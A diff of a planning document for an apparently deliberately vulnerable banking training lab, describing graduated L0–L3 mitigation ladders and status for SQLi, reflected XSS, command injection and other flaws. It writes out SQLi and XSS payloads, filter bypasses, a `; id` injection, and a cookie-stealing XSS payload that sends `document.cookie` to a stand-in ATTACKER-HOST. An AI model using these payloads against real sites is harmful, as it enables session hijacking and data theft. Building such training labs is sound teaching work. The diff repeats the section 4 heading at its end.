@@ -1,10 +1,10 @@
 # Vulnerability Level Plan — Next Batch
 
-Planning doc for the next set of vulnerabilities to rework into graduated ladders,
+Planning doc for the set of vulnerabilities to rework into graduated ladders,
 following the reference pattern already shipped for **auth.g1** and **auth.l11**
-(see `docs/VULN_REWORK_CHECKLIST.md`). **Nothing here is implemented yet** — this is
-the agreed plan; we pick one at a time, implement, verify live, document, and mark
-verified before moving on.
+(see `docs/VULN_REWORK_CHECKLIST.md`). **Status below mirrors `VULN_MATRIX.html`**,
+which is the authoritative record of which rungs are built and verified. We pick one
+at a time, implement, verify live, document, and mark verified before moving on.
 
 Level convention (same as the engine): **L0** fully vulnerable → **L1** weak
 mitigation (still bypassable) → **L2** partial/harder fix (still bypassable, a
@@ -12,26 +12,42 @@ mitigation (still bypassable) → **L2** partial/harder fix (still bypassable, a
 is true while level < 3. Scoring keeps the existing per-vuln `points` arrays
 (increasing with level; +50 steps; L3 = 0).
 
-Status legend: ☐ planned · ◐ in progress · ✅ implemented+verified.
+Status legend: ☐ not started (L0 only) · ◐ in progress · ✅ built + verified (L0–L3) · 🎓 training-only (not scored). Reconciled with `VULN_MATRIX.html` on 2026-11-16. "Current lvl" is the level the engine is set to now.
 
 | # | Vuln | Module.key | CWE | Current lvl | Points | Status |
 |---|------|-----------|-----|-------------|--------|--------|
-| 1 | Session puzzling | auth.l25 | 841 | 3 | 300/350/400 | ☐ |
-| 2 | SQLi (data extraction) | statements.g2 | 89 | 3 | 300/350/400 | ☐ |
-| 3 | Reflected XSS | statements.g4 | 79 | 3 | 100/150/200 | ☐ |
-| 4 | Command injection | statements.g9 | 78 | 3 | 300/350/400 | ☐ |
-| 5 | IDOR — transfer from other account | transfer.l1 | 639 | 3 | 300/350/400 | ☐ |
+| 1 | Session puzzling | auth.l25 | 841 | 1 | 300/350/400 | ◐ L0+L1 verified; L2 not differentiated (mirrors L1), flag deferred |
+| 2 | SQLi (data extraction) | statements.g2 | 89 | 3 | 300/350/400 | ✅ |
+| 3 | Reflected XSS | statements.g4 | 79 | 1 | — (training only) | 🎓 built (L0–L3), not scored |
+| 4 | Command injection | statements.g9 | 78 | 3 | 300/350/400 | ✅ honeypot shell + blacklist ladder |
+| 5 | IDOR — transfer from other account | transfer.l1 | 639 | 2 | 300/350/400 | ✅ |
 | 6 | XXE | loans.g10 | 611 | 3 | 300/350/400 | ☐ |
 | 7 | JWT forgery | auth.l12 | 347 | 3 | 300/350/400 | ✅ |
 | 8 | Insecure deserialization | sessions.g12 | 502 | 3 | 300/350/400 | ☐ |
 | 9 | SSRF | loans.g6 | 918 | 3 | 300/350/400 | ☐ |
 | 10 | Broken function-level authz | admin.l4 | 285 | 3 | 100/150/200 | ☐ |
-| 11 | Stored XSS (beneficiary name) | beneficiary.g3 | 79 | 0 | 200/250/300 | ☐ |
+| 11 | Stored XSS (beneficiary name) | beneficiary.g3 | 79 | 3 | 200/250/300 | ☐ |
 
-> All sit at L3 (secure) today **except beneficiary.g3** (L0). So for most the work is
-> building out the L0/L1/L2 rungs and verifying them; the L3 fix likely already exists.
-> The L1/L2 designs below are proposals — reconcile with the actual source when
-> implementing each (L0 must match real behaviour; L3 must be the genuine fix).
+### Already-shipped reference ladders (full L0–L3, verified — not part of the batch above)
+
+| Vuln | Module.key | CWE | Current lvl | Status (per `VULN_MATRIX.html`) |
+|------|-----------|-----|-------------|---------------------------------|
+| SQLi — login bypass | auth.g1 | 89 | 0 | ✅ error-based → blacklist (OR-tautology bypass) → blind + parens (`') -- `) → prepared + bcrypt + lockout |
+| OTP in response body (2FA bypass) | auth.l11 | 287 | 3 | ✅ plaintext OTP/flag → predictable (sha256(seed·uid)) → secrets in headers (brute-force) → server-side only |
+
+### Related auth/OTP vulns still L0-only (no ladder yet)
+
+| Vuln | Module.key | CWE | Current lvl | Status |
+|------|-----------|-----|-------------|--------|
+| OTP brute-force (no rate limit) | auth.l10 | 307 | 3 | ☐ L0 only |
+| Account enumeration (login oracle) | auth.l16 | 204 | 3 | ☐ L0 only |
+
+> Reconciled with `VULN_MATRIX.html` (2026-11-16). **✅ done (L0–L3 verified):** statements.g2,
+> statements.g4 (training-only), statements.g9, transfer.l1, auth.l12 — plus reference ladders
+> auth.g1 & auth.l11. **◐ in progress:** auth.l25 (L0+L1 done; L2 + flag left). **☐ not started
+> (L0 only):** loans.g10, sessions.g12, loans.g6, admin.l4, beneficiary.g3 — and auth.l10, auth.l16.
+> The L1/L2 designs below are proposals — reconcile with the actual source when implementing each
+> (L0 must match real behaviour; L3 must be the genuine fix).
 
 ---
 
@@ -96,14 +112,53 @@ no modal — the participant reads it out of the DB and submits it.
   (`house%' AND SUBSTRING((SELECT flag…),1,1)='B'-- `, walk each position).
 - **L3** — Search term bound as a parameter (`remarks LIKE :q`); dates always bound.
 
-## 3. statements.g4 — Reflected XSS (CWE-79)
-**Goal:** execute JS in the victim's browser via a reflected parameter → steal flag.
-- **L0** — Raw reflection of a query param into HTML; `<script>` fires.
-- **L1** — Non-recursive strip of `<script>` → bypass `<scr<script>ipt>` or
-  `<img onerror=...>` event handlers.
-- **L2** — `<>` HTML-encoded, but value reflected into an **attribute / JS string**
-  context unescaped → break out with `"` or `';`.
-- **L3** — Context-aware output encoding + CSP.
+## 3. statements.g4 — Reflected XSS (CWE-79)  🎓 TRAINING / PENTEST ONLY — removed from CTF
+**Goal:** demonstrate reflected XSS and its mitigation ladder across two reflection contexts
+(body text + the search box `value="…"` attribute). **Not part of the CTF** — marked
+`ctf_eligible=false`, so it is never scored, never delivered a flag, and not selectable on the
+CTF Vulnerabilities page. The payload executes in the player's **own** browser; the lab is for
+learning the vuln and its fixes, not for capturing a flag.
+
+**History (reverted 2026-11-12):** an admin/victim **bot** flag-delivery path (Google Chrome
+headless + PHP, no Node) was built and verified end-to-end, then **removed the same day** — the
+exploit was too unreliable to hinge a flag on. The whole subsystem is gone: `src/modules/xss/*`,
+`bin/xss_bot.php`, the `/xss/report|status|bot|collect` routes, the `xss_bot_runs` table +
+`sql/05-xss-bot-runs.sql`, and the player-facing "Report to Support" panel. Only the reflection
+ladder remains.
+
+### Level ladder (reflection only — fires in the player's own browser)
+Implemented in `g4_text()` / `g4_attr()` (`src/core/helpers.php`):
+- **L0** — raw reflection into HTML text. `<img src=x onerror=alert(document.domain)>` or
+  `<script>alert(1)</script>` executes.
+- **L1** — single-pass strip of `<script>`/`</script>`. Naive `<script>…</script>` is
+  neutralised. Bypass: an event-handler tag (`<img src=x onerror=…>`, `<svg onload=…>`) or a
+  nested `<scr<script>ipt>` that the one pass collapses back.
+- **L2** — `<`/`>` HTML-encoded in the text sink, BUT `q` is **also** reflected into the search
+  box `value="…"` attribute unescaped → break out with `">…`.
+- **L3** — context-aware encoding (`htmlspecialchars` in both contexts) → nothing executes.
+  (A strict `script-src 'self'` CSP would break the app's own inline scripts, so L3 is encoding
+  only; CSP noted as recommended hardening, not enforced.)
+
+**Session-cookie HttpOnly ladder** (`src/core/Session.php`, `xssCookieReadable()` → keyed on g4):
+- **L0** — `PHPSESSID` has **no `HttpOnly`**, so a payload can steal the session via
+  `document.cookie` → full session hijack:
+  `"><img src=x onerror="new Image().src='//ATTACKER-HOST/x?c='+encodeURIComponent(document.cookie)">`.
+- **L1–L3** — `PHPSESSID` is `HttpOnly`, so `document.cookie` can't read it; cookie theft fails and
+  you escalate to **session-riding** (a same-origin `fetch('/api/v1/profile')` that rides the
+  victim's live session and exfiltrates their data). HttpOnly is owned by g4 here, independent of
+  auth.l14 (which keeps id-regeneration + SameSite). Verified live: g4 L0 `Set-Cookie: PHPSESSID`
+  has no HttpOnly; L1/L2/L3 do.
+
+### Enforcement (how "training only" is guaranteed)
+`ctf_eligible=false` is honoured centrally: `TrainingEngine::isCtfActive('statements','g4')`
+always returns false and `setCtfActive()` refuses to enable it, so "Select all" / bulk can't add
+it. The CTF Vulnerabilities page renders g4 as a disabled **"Training only"** row. Flag submission
+(`tr_submit_flag`) already gates on `isCtfActive`, so a g4 flag can never score. Hints
+(`hints_config.json`) retargeted to the ladder — no bot, no flag.
+
+## 4. statements.g9 — Command injection (CWE-78)
+**Goal:** run OS commands via a feature that shells out (export/PDF/filename).
+- **L0** — Input concatenated into a shell command; `; id` works.
 
 ## 4. statements.g9 — Command injection (CWE-78)
 **Goal:** run OS commands via a feature that shells out (export/PDF/filename).
